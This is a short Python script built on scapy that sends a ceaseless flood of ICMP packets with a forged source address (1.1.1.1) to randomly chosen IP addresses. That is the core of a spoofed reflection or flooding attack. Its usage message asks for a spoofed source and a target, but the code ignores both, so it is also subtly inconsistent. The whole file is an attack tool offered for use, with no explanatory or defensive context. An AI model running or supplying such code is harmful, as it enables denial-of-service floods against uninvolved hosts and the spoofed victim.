import sys, random
from scapy.all import send, IP, ICMP
if len(sys.argv) < 2:
    print (sys.argv[0] + " <spoofed_source_ip> <target>" )
    sys.exit(0)
while 1:
    pdst= "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
    psrc="1.1.1.1" 
    send(IP(src=psrc,dst=pdst)/ICMP())